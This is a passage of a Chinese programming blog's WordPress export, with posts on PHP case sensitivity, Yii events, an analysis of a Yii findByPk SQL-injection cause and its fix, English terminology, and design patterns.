echo BLOGGER;    //输出'Veitor'
echo BLOgger;    //报NOTICE提示，并输出'BLOgger'
echo blogger;    //报NOTICE提示，并输出'blogger'
?&gt;</pre>
<strong>3、数组索引（键名）区分大小写</strong>
<pre class="lang:php decode:true ">&lt;?php
$arr = array('one'=&gt;'first');
echo $arr['one'];    //输出'first'
echo $arr['One'];    //无输出并报错
echo $Arr['one'];    //上面讲过，变量名区分大小写，所以无输出并报错
?&gt;</pre>
&nbsp;
<blockquote><strong>大小写不敏感</strong></blockquote>
<strong>1. 函数名、方法名、类名不区分大小写</strong>
虽然这些不区分大小写，但坚持“大小写敏感”原则，建议还是使用与定义时相同大小写的名字
<pre class="lang:php decode:true">&lt;?php
class Test
{
    static public function Ceshi()
    {
        echo '123';
    }
    public funcion Dxx()
    {
        echo '321';
    }
}
$obj = new Test;
$obj-&gt;Dxx();    //成功实例化Test类，并调用Dxx方法输出'321'
$obj-&gt;dxx();    //成功实例化Test类，并调用Dxx方法输出'321'
$obj = new test;
$obj-&gt;Dxx();    //成功实例化Test类，并调用Dxx方法输出'321'
$obj-&gt;dxx();    //成功实例化Test类，并调用Dxx方法输出'321'
Test::Ceshi();    //输出'123'
test::Ceshi();    //输出'123'
Test::ceshi();    //输出'123'
test::ceshi();    //输出'123'
?&gt;</pre>
<strong>2、魔术常量不区分大小写</strong>
一些魔术常量包括：__LINE__、__FILE__、__DIR__、__FUNCTION__、__CLASS__、__METHOD__、 __NAMESPACE__等都不区分大小写。
<pre class="lang:php decode:true">&lt;?php
echo __LINE__;    //输出2
echo __line__;    //输出3
?&gt;</pre>
<strong> 3、 NULL、TRUE、FALSE不区分大小写</strong>
这个知道的人应该比较多就不举例了。
<strong>4、强制类型转换不区分大小写</strong>
如这些
(int)，(integer) – 转换成整型
(bool)，(boolean) – 转换成布尔型
(float)，(double)，(real) – 转换成浮点型
(string) – 转换成字符串
(array) – 转换成数组
(object) – 转换成对象
一般我们都小写，这个问题不大。
&nbsp;
<strong><span style="text-decoration: underline;">总的来说，容易搞不明白的就是变量、常量、类名、方法名和函数名，把这些记住对自己会有帮助的。</span></strong>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>501</wp:post_id>
		<wp:post_date><![CDATA[2015-02-25 14:44:24]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-02-25 14:44:24]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[php%e5%91%bd%e5%90%8d%e5%a4%a7%e5%b0%8f%e5%86%99%e6%95%8f%e6%84%9f%e8%a7%84%e5%88%99]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>Yii事件机制分析</title>
		<link>http://wp.veitor.net/2015/02/26/yii%e4%ba%8b%e4%bb%b6%e6%9c%ba%e5%88%b6%e5%88%86%e6%9e%90/</link>
		<pubDate>Thu, 26 Feb 2015 13:34:26 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=508</guid>
		<description></description>
		<content:encoded><![CDATA[在Yii中使用事件需要三个步骤：1、定义事件；2、定义事件回调函数；3、将回调函数添加到事件中4、触发事件。
Yii事件机制的实现是在其底层基类CComponent类里，这是所有组件的基类。
<h2>1、如何定义事件</h2>
很简单，事件以on开头的命名方式定义，如以下定义了一个onEcho的事件：
<pre class="lang:php decode:true">public function onEcho($event)
{
     $this-&gt;raiseEvent('onEcho', $event);
}</pre>
这样就定义了一个事件，其中$event参数是一个CEvent或其子类的实例（但其实用到的并不多，下面再说）。
<h2>2、定义事件回调函数</h2>
<span style="line-height: 1.5em;">回调函数可以是一个全局函数或者一个类中的函数（说白了就是一个函数而已），其需要一个参数$event，如下：</span>
<pre class="lang:php decode:true crayon-selected">public function huidiao($event)
{
     //TODO
}</pre>
$event参数其实是接收定义事件时传入的那个参数，也就是上面第一步定义的事件函数的参数，它最终会传到这个回调函数里来。然后回调函数根据业务逻辑使用这个参数，但一般情况下我们不怎么使用到这个参数，所以意义也不是很大，不过如果你需要参数的情况下可以通过这样方式定义，因为传入的参数并不一定限制是CEvent的实例或其子类，也可以是其他类型（待会下面继续解释）。
<h2>3、将回调函数添加到事件中</h2>
为啥还要将回调函数添加到事件中呢？因为当事件触发后总得要有程序逻辑（也就是一段php代码）去处理业务是吧。所以光光的定义一个事件而不往里面添加回调函数是没有意义的，而且即使定义了回调函数却添加到事件里也是没有意义的。就如同你只买了个电脑主机有啥意义呢？也或者你只买了一台显示器也同样没有意义，要将两者结合才是他们真正的用处。
那么如何将回调函数添加到事件中？
<div>
<div>一种方法：$this-&gt;onEcho=array($this, 'huidiao');</div>
<div>另一种方法：$this-&gt;attachEventHandler('onEcho', array($this, 'huidiao'));</div>
<div>第一种方法利用了Yii组件中setter原理，看代码：</div>
<div>
<pre class="lang:php decode:true ">public function __set($name,$value)
{
	$setter='set'.$name;
	if(method_exists($this,$setter))
		return $this-&gt;$setter($value);
	elseif(strncasecmp($name,'on',2)===0 &amp;&amp; method_exists($this,$name))
	{
		// duplicating getEventHandlers() here for performance
		$name=strtolower($name);
		if(!isset($this-&gt;_e[$name]))
			$this-&gt;_e[$name]=new CList;
		return $this-&gt;_e[$name]-&gt;add($value);
	}
	elseif(is_array($this-&gt;_m))
	{
		foreach($this-&gt;_m as $object)
		{
			if($object-&gt;getEnabled() &amp;&amp; (property_exists($object,$name) || $object-&gt;canSetProperty($name)))
				return $object-&gt;$name=$value;
		}
	}
	if(method_exists($this,'get'.$name))
		throw new CException(Yii::t('yii','Property "{class}.{property}" is read only.',
			array('{class}'=&gt;get_class($this), '{property}'=&gt;$name)));
	else
		throw new CException(Yii::t('yii','Property "{class}.{property}" is not defined.',
			array('{class}'=&gt;get_class($this), '{property}'=&gt;$name)));
}</pre>
这是一个魔术方法__set，6-13行是给事件添加回调函数的步骤。如果类里面存在以on开头的函数，那么将事件放到私有变量$_e里，$_e是个数组，其键名是事件名称，其值是一个CList实例（也可以理解为一个数组，因为CList实现了一个整数索引的集合类，可以用数组的形式往里面添加元素 ，可详见CList），再使用CList中add方法往数组形式的值里面添加回调函数，也等同于$_e['onecho'][]=array($this,'huidiao')。那么按我上面添加一个事件来说，添加一个回调函数huidiao后$_e的内容应该是array('onecho'=&gt;array(array($this,'huidiao'))
第二种方法使用了类中的attachEventHandler函数，代码如下：
<pre class="lang:php decode:true  crayon-selected">public function attachEventHandler($name,$handler)
{
	$this-&gt;getEventHandlers($name)-&gt;add($handler);
}
public function getEventHandlers($name)
{
	if($this-&gt;hasEvent($name))
	{
		$name=strtolower($name);
		if(!isset($this-&gt;_e[$name]))
			$this-&gt;_e[$name]=new CList;
		return $this-&gt;_e[$name];
	}
	else
		throw new CException(Yii::t('yii','Event "{class}.{event}" is not defined.',
			array('{class}'=&gt;get_class($this), '{event}'=&gt;$name)));
}
public function hasEvent($name)
{
	return !strncasecmp($name,'on',2) &amp;&amp; method_exists($this,$name);
}</pre>
attachEventHandler函数首先用getEventHandler函数获取需要添加回调函数的事件，用hasEvent判断是否存在这个事件函数名，如果存在的话（也就是定义事件函数的话）就和第一种方法原理一样，获得$_e['onecho']的值（CList实例），使用其方法add往数组形式的值里添加回调函数。
至此，回调函数都已经添加到事件中去了。
<h2>4、触发事件</h2>
这个比较简单，在你需要执行这个事件的地方调用第1步定义的事件，如$this-&gt;onEcho($event)，函数执行里面的一句话$this-&gt;raiseEvent('onEcho'.$event)，raiseEvent这个方法代码如下：
<pre class="lang:php decode:true ">public function raiseEvent($name,$event)
{
	$name=strtolower($name);
	if(isset($this-&gt;_e[$name]))
	{
		foreach($this-&gt;_e[$name] as $handler)
		{
			if(is_string($handler))
				call_user_func($handler,$event);
			elseif(is_callable($handler,true))
			{
				if(is_array($handler))
				{
					// an array: 0 - object, 1 - method name
					list($object,$method)=$handler;
					if(is_string($object))	// static method call
						call_user_func($handler,$event);
					elseif(method_exists($object,$method))
						$object-&gt;$method($event);
					else
						throw new CException(Yii::t('yii','Event "{class}.{event}" is attached with an invalid handler "{handler}".',
							array('{class}'=&gt;get_class($this), '{event}'=&gt;$name, '{handler}'=&gt;$handler[1])));
				}
				else // PHP 5.3: anonymous function
					call_user_func($handler,$event);
			}
			else
				throw new CException(Yii::t('yii','Event "{class}.{event}" is attached with an invalid handler "{handler}".',
					array('{class}'=&gt;get_class($this), '{event}'=&gt;$name, '{handler}'=&gt;gettype($handler))));
			// stop further handling if param.handled is set true
			if(($event instanceof CEvent) &amp;&amp; $event-&gt;handled)
				return;
		}
	}
	elseif(YII_DEBUG &amp;&amp; !$this-&gt;hasEvent($name))
		throw new CException(Yii::t('yii','Event "{class}.{event}" is not defined.',
			array('{class}'=&gt;get_class($this), '{event}'=&gt;$name)));
}</pre>
这个方法会获得$_e['onecho']值，那么这个值是数组形式对吧，而且数组的每个元素都是一个回调函数，那么用foreach对其进行遍历（代码第6行），循环部分的代码最终都是调用了call_user_func，把回调函数和$event传入进去，那么回调函数就被执行了，并且该回调函数得到的参数是触发事件时$this-&gt;onEcho($event)的这个$event参数。所以我在第2步中说道，这个$event参数并不一定要CEvent的实例或其子类，因为要看你回调函数需要什么参数。这么一看，通过foreach后，注册到这个事件onEcho中的所有回调函数都会被执行一遍。
那么就这样完成了整个事件了，还比较容易理解吧？有任何疑问可以留言，一起探讨
</div>
</div>
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>508</wp:post_id>
		<wp:post_date><![CDATA[2015-02-26 13:34:26]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-02-26 13:34:26]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[yii%e4%ba%8b%e4%bb%b6%e6%9c%ba%e5%88%b6%e5%88%86%e6%9e%90]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="yii"><![CDATA[Yii]]></category>
		<category domain="post_tag" nicename="%e4%ba%8b%e4%bb%b6"><![CDATA[事件]]></category>
		<category domain="category" nicename="bianchengyuyan"><![CDATA[编程语言]]></category>
						</item>
					<item>
		<title>编程中英语单词state和status的区别</title>
		<link>http://wp.veitor.net/2015/02/28/%e7%bc%96%e7%a8%8b%e4%b8%ad%e8%8b%b1%e8%af%ad%e5%8d%95%e8%af%8dstate%e5%92%8cstatus%e7%9a%84%e5%8c%ba%e5%88%ab/</link>
		<pubDate>Sat, 28 Feb 2015 01:24:19 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=511</guid>
		<description></description>
		<content:encoded><![CDATA[state：比较常用，各种状态都可以用它，但是它更着重于一种心理状态或者物理状态。
Status：用在人的身上一般是其身份和地位，作“状态，情形”讲时，多指政治和商业。
state倾向于condition，是一种延续性的状态。status常用于描述一个过程中的某阶段（phase），类似于C语言中枚举型变量某一个固定的值，这个值属于一个已知的集合。
比如淘宝买家问卖家“我的网购现在是什么状况？”
这个问题的背景是讲话双方都清楚，交易状态有“买家选购”“买家已付款”“卖家已发货”“买家已签收”或者有“买家已
投诉”等等状态。这些状态描述一件事情发展过程中的不同阶段。而且，这些阶段的先后顺序也是双方默许的。
所以在这里可以问“What's the status of my purchase?”，此处用state不太贴切，如果硬用上去从语感上可能听着别扭。
说物态变化用state再恰当不过。如果说一个物质的四种状态，可以说“solid state”，但如果你说“solid status”，第
一，这两个词的组合不像是描述物态，更像是在说“确定的状况（solid产生歧义‘确定的/确凿的’）”；第二，这个说法即
使不被误解，也需要事先约定一组物态变化顺序，比如把这个物质从固态开始加热然后电离，可能先后经历固态、液态、气态、等离子态这四个阶段。类似先定义枚举，然后引用的方式。
&nbsp;
扩展：
ajax中readyState，statusText，onreadystatechange，window.status怎么一会state一会是status都晕乎了
state所指的状态，一般都是有限的、可列举的，status则是不可确定的。
比如
readyState -- 就那么四五种值
statusText -- 描述性的文字，可以任意
onreadystatechange -- 那么四五种值之间发生变化
window.status -- 描述性的文字，可以任意
来个形象的比方，你体重多少公斤，属于status，但说你体重属于偏瘦、正常还是偏胖，那就是state.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>511</wp:post_id>
		<wp:post_date><![CDATA[2015-02-28 01:24:19]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-02-28 01:24:19]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e7%bc%96%e7%a8%8b%e4%b8%ad%e8%8b%b1%e8%af%ad%e5%8d%95%e8%af%8dstate%e5%92%8cstatus%e7%9a%84%e5%8c%ba%e5%88%ab]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="category" nicename="jingyanfengxiang"><![CDATA[经验分享]]></category>
		<category domain="post_tag" nicename="%e8%8b%b1%e8%af%ad"><![CDATA[英语]]></category>
						</item>
					<item>
		<title>世界，您好！</title>
		<link>http://wp.veitor.net/2019/11/20/hello-world/</link>
		<pubDate>Wed, 20 Nov 2019 14:11:04 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://wp.veitor.net/?p=1</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:paragraph -->
<p>欢迎使用WordPress。这是您的第一篇文章。编辑或删除它，然后开始写作吧！</p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1</wp:post_id>
		<wp:post_date><![CDATA[2019-11-20 22:11:04]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-11-20 14:11:04]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[hello-world]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:comment>
			<wp:comment_id>1</wp:comment_id>
			<wp:comment_author><![CDATA[一位WordPress评论者]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[wapuu@wordpress.example]]></wp:comment_author_email>
			<wp:comment_author_url>https://wordpress.org/</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2019-11-20 22:11:04]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2019-11-20 14:11:04]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[嗨，这是一条评论。
要开始审核、编辑及删除评论，请访问仪表盘的“评论”页面。
评论者头像来自<a href="https://gravatar.com">Gravatar</a>。]]></wp:comment_content>
			<wp:comment_approved><![CDATA[trash]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[_wp_trash_meta_status]]></wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
			</wp:commentmeta>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[_wp_trash_meta_time]]></wp:meta_key>
			<wp:meta_value><![CDATA[1574259717]]></wp:meta_value>
			</wp:commentmeta>
							</wp:comment>
					</item>
					<item>
		<title>使用composer安装yii2出现&#034;could not parse version..&#034;的问题</title>
		<link>http://wp.veitor.net/2015/08/14/%e4%bd%bf%e7%94%a8composer%e5%ae%89%e8%a3%85yii2%e5%87%ba%e7%8e%b0could-not-parse-version-%e7%9a%84%e9%97%ae%e9%a2%98/</link>
		<pubDate>Fri, 14 Aug 2015 00:53:42 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=528</guid>
		<description></description>
		<content:encoded><![CDATA[如果安装时出现这个错误
<pre class="lang:php decode:true">[UnexpectedValueException]
Could not parse version constraint &lt;=2.*: Invalid version string "2.*"</pre>
很有可能是composer Asset插件版本的问题
官网说明使用“composer global require "fxp/composer-asset-plugin:~1.0.0"”
可是会出错，所以如果出错了，使用这个命令"composer global require "fxp / composer-asset-plugin: 1.0.1"重新安装一遍后，再安装yii2应该会正常了]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>528</wp:post_id>
		<wp:post_date><![CDATA[2015-08-14 00:53:42]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-08-14 00:53:42]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e4%bd%bf%e7%94%a8composer%e5%ae%89%e8%a3%85yii2%e5%87%ba%e7%8e%b0could-not-parse-version-%e7%9a%84%e9%97%ae%e9%a2%98]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="category" nicename="jingyanfengxiang"><![CDATA[经验分享]]></category>
						</item>
					<item>
		<title>博客上阿里云了</title>
		<link>http://wp.veitor.net/2015/11/06/536/</link>
		<pubDate>Fri, 06 Nov 2015 17:01:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=536</guid>
		<description></description>
		<content:encoded><![CDATA[<p>&lt;!--markdown--&gt;好久没收拾博客了，折腾了好几天终于迁移到了阿里云上了，同时将SAE环境改成自己搭建的LNMP，完成了从wordpress数据的迁移转换。<br />接下来继续完善，自己写插件支持七牛云存储。<br />这篇文章就当是测试的吧。。测试评论、测试分享、测试新的编辑器等等等</p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>536</wp:post_id>
		<wp:post_date><![CDATA[2015-11-06 17:01:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-11-06 17:01:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[536]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
						</item>
					<item>
		<title>关于Yii中findByPk被sql注入的一个误区</title>
		<link>http://wp.veitor.net/2015/11/09/543/</link>
		<pubDate>Mon, 09 Nov 2015 15:15:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=543</guid>
		<description></description>
		<content:encoded><![CDATA[<p>&lt;!--markdown--&gt;树大招风，当然网站被恶意攻击注入是常有的事，这也是对一个程序员代码质量以及经验水平的考验。</p><p>今天公司一个项目不幸被sql注入了，根据日志查询到了注入点，是某个详情页的代码，大致就是根据某条数据id查询该条数据。</p><p>理所当然的，我们会使用Yii中Ar类提供的<code>findByPk()</code>方法来查询该数据，而正是这里却被注入了。</p><!--more--><p>首先有人可能会想，数据的主键，不就是一个自增id数字吗？那未必，但大多数情况下其实就是自增id。</p><p>那么既然是自增id，是int型，Yii提供的这个方法不会帮我们去验证字段类型吗？Yii当然会帮我们验证该字段类型。这里推荐一下这篇文章（<a href="http://www.yiiframework.com/wiki/275/how-to-write-secure-yii-applications/">http://www.yiiframework.com/wiki/275/how-to-write-secure-yii-applications/</a>），比较适合使用Yii开发的人员如何注意安全</p><p>这篇文章中有段提到：In fact, Yii will help, even in the first case. The method findByPk() uses the table schema to ensure that a numeric column only gets numeric criteria.</p><p>说明使用Yii的findByPk()会使用数据表schema确保对应类型的字段获得对应类型的查询条件，那么也就是说int型自增id字段通过这个函数传入id值，都是能验证或转换成对应的int型。可此时此刻并没有，我们还是被注入了。</p><p>那么我们就要去分析一下到底是什么原因导致了这样，难道是Yii版本的问题？我们分析一下源码。</p><p>从Ar类<code>ActiveRecord</code>入手，找到<code>findByPk()</code>，再找到了<code>CDbCommandBuilder</code>类中的<code>createPkCriteria()</code>方法，接着找到同类中的<code>createInCondition()</code>方法，会发现该方法中使用了一个方法<code>typecast()</code>将传入的id值进行了类型转换，这个方法位于<code>CMysqlColumnSchema</code>类中，该类的一个实例就代表着一张表中的一个字段，在这里是主键id字段，其源代码是这样的：</p><pre><code>public function typecast($value)
{
    if(gettype($value)===$this-&gt;type || $value===null || $value instanceof CDbExpression)
        return $value;
    if($value==='' &amp;&amp; $this-&gt;allowNull)
        return $this-&gt;type==='string' ? '' : null;
    switch($this-&gt;type)
    {
        case 'string': return (string)$value;
        case 'integer': return (integer)$value;
        case 'boolean': return (boolean)$value;
        case 'double':
        default: return $value;
    }
}
</code></pre><p><code>$value</code>是传入的id值，<code>$this-&gt;type</code>是字段类型，假设弱类型语言php获得到的id数字是string类型，字段类型是integer，那么逻辑就会进入switch内，并且走的是case 'integer'，将string类型转换为integer，但并没有。<br />打印$this-&gt;type出来看，竟然显示的是<code>string</code>，也就是Yii将该表中的主键id认为是string类型，也就因此没有将传入参数转换成integer型，所以被注入了。</p><p>但究竟是什么原因导致的？于是接着开始找是什么地方使得$this-&gt;type值为string的，于是找到该类的<code>extractType()</code>方法，这方法传了一个参数<code>$dyType</code>，但在哪被调用传入的呢？我们可以看到这个<code>CMysqlColumnSchema</code>类继承了<code>CDbColumnSchema</code>，在<code>CDbColumnSchema</code>类中的<strong><code>init()</code></strong>方法中就调用了<code>extractType()</code>，但<code>init</code>方法中传入的第一个参数还是我们想要知道的<code>$dbType</code>，于是接着找哪个地方又调用了该方法。</p><p>我们看<br /><code>CDbSchema</code>类，这是一个抽象类，<code>CMysqlSchema</code>继承了它，在CDbConnection中使用了<code>CMysqlSchema</code>作为mysql驱动类。<br />当我们要获得表的schema时，必定要调用到该类中的<code>getTable()</code>方法，而该方法又调用了同类或子类中的<code>loadTable()</code>，意思就是获得表信息，传入的参数就是表名，接着调用了同类中的<code>findColumns()</code>方法，查找出当前表中的字段，方法中使用了<code>SHOW FULL COLUMNS FROM TABLE</code>，然后获得的了一个数组，数组中包含着各个字段名，再使用<code>createColumn()</code>方法将每个字段实例化一个<code>CMysqlColumnSchema</code>实例，那么就又回到上面将的这个类了，此时这里执行该类中的<code>init()</code>方法了（上面标粗的地方），并且传入了数据库获得到的字段类型，此时<code>$dbType</code>的值是<code>int(10) unsigned</code>，也正是我们数据库中设定的类型。</p><p><code>init()</code>方法自然就执行了同类中的<code>extractType()</code>方法，现在我们就仔细看这个类：</p><pre><code>protected function extractType($dbType)
{
    if(strncmp($dbType,'enum',4)===0)
        $this-&gt;type='string';
    elseif(strpos($dbType,'float')!==false || strpos($dbType,'double')!==false)
        $this-&gt;type='double';
    elseif(strpos($dbType,'bool')!==false)
        $this-&gt;type='boolean';
    elseif(strpos($dbType,'int')===0 &amp;&amp; strpos($dbType,'unsigned')===false || preg_match('/(bit|tinyint|smallint|mediumint)/',$dbType))
        $this-&gt;type='integer';
    else
        $this-&gt;type='string';
}
</code></pre><p>其中<code>$dbType</code>的值是"int(10) unsigned"，这是通过<code>SHOW FULL COLUMNS FROM TABLE</code>得来的，那么对应到PHP中该是哪种类型呢？看代码，我们会发现最终程序走了最后的<code>else</code>，这里导致了<code>$this-&gt;type</code>为<code>string</code>。也就因此没有转换我们的传入值。</p><p>网上我们可以看到这个问题：<a href="https://code.google.com/p/yii/issues/detail?id=1820#c1">https://code.google.com/p/yii/issues/detail?id=1820#c1</a></p><p>数据库中无符号的int型在php中如果用integer型可能会失去精度，因此用了string。</p><p>解决办法就是建表的时候，建议将每个int型字段不要设置unsigned，毕竟signed int能存入的值已经够我们用了。</p><p>这样一来，使用Yii中<code>findByPk()</code>方法就是自动帮我们把传入参数转为<code>integer</code>型了。</p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>543</wp:post_id>
		<wp:post_date><![CDATA[2015-11-09 15:15:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-11-09 15:15:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[543]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="yii"><![CDATA[Yii]]></category>
		<category domain="category" nicename="jingyanfengxiang"><![CDATA[经验分享]]></category>
						</item>
					<item>
		<title>设计模式笔记：第一个设计模式原则——按接口编程</title>
		<link>http://wp.veitor.net/2015/12/21/544/</link>
		<pubDate>Mon, 21 Dec 2015 14:02:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=544</guid>
		<description></description>
		<content:encoded><![CDATA[<p>&lt;!--markdown--&gt;第一个设计模式原则：按接口而不是按实现来编程。<br />以最简单的方式来讲就是，要将变量设置为一个抽象类或接口数据类型的实例，而不是一个具体实现的实例。</p><!--more--><p>比如说，声明一个变量<code>$bianliang</code>，那么其值类型应该是某个抽象类或接口。这在强类型语言中比较容易做到，假设有个接口ITest，那么我声明变量则应该是这样声明的<code>ITest bianliang</code>，此时变量<code>bianliang</code>的数据类型是<code>ITest</code>。但对于PHP来说，这可能有些困难，因为PHP变量的数据类型是在给该变量赋值时而确定的，但抽象类或接口不能被直接实例化（因为需要被继承实现啊），所以也就无法得到一个接口数据类型的PHP变量。最多得到一个该接口具体实现类的数据类型的变量。看下列代码及注释：</p><pre><code>//现有一个接口ITest
Interface ITest
{
    ...
}
//现有一个类Ceshi，实现了ITest
class Ceshi implenmts ITest
{
    ...
}
//那么，最多我声明的变量$bianliang的数据类型是Ceshi
$bianliang = new Ceshi;</code></pre><p>但其实没关系，变量<code>$bianliang</code>的数据类型不仅是<code>Ceshi</code>，<code>ITest</code>也可以作为该变量的数据类型。记住这一句话：<strong>一个对象实例的数据类型不仅是它实例化的对象类型，该对象的父类也将作为它的数据类型</strong></p><p>在这里要注意一点是，按接口编程中的接口这个概念，并不是只用关键字Interface创建的才叫接口，我们这里的接口可以指Interface创建出来的也可以指某个抽象类，我觉得其实所有类都可以成为接口，不过这里我们就只要认为是Interface和抽象类吧，免得搞混。</p><p>来一个按接口编程的例子：</p><pre><code>abstract class IAbstract
{
    //对所有实现都可用的属性
    protected $valueNow;
    /*所有实现都必须包含以下两个方法*/
    //必须返回十进制值
    abstract protected function giveCost();
    //必须返回字符串值
    abstract protected function giveCity();
    //这个具体函数对所有类实现都可以用，而不覆盖内容
    public function displayShow()
    {
        $stringCost =  $this-&gt;giveCost();
        $stringCost = (string)$stringCost;
        $allTogether = (&quot;Cost: $&quot;: . $stringCost . &quot; for &quot; . $this-&gt;giveCity());
        return $allTogether;
    }
}
//接下来是这个抽象类的两个不同扩展，它们分别提供抽象方法的不同实现。
class NorthRegion extends IAbstract
{
    //必须返回十进制值
    protected function giveCost()
    {
        return 210.54;
    }
    //必须返回字符串值
    protected function giveCity()
    {
        return &quot;Moose Breath&quot;;
    }
}
class WestRegion extends IAbstract
{
    //必须返回十进制值
    protected function giveCost()
    {
        $solarSavings = 2;
        $this-&gt;valueNow=210.54/$solarSavings;
        return $this-&gt;valueNow;
    }
    //必须返回字符串值
    protected function giveCity()
    {
        return &quot;Rattlesnake Gulch&quot;;
    }
}
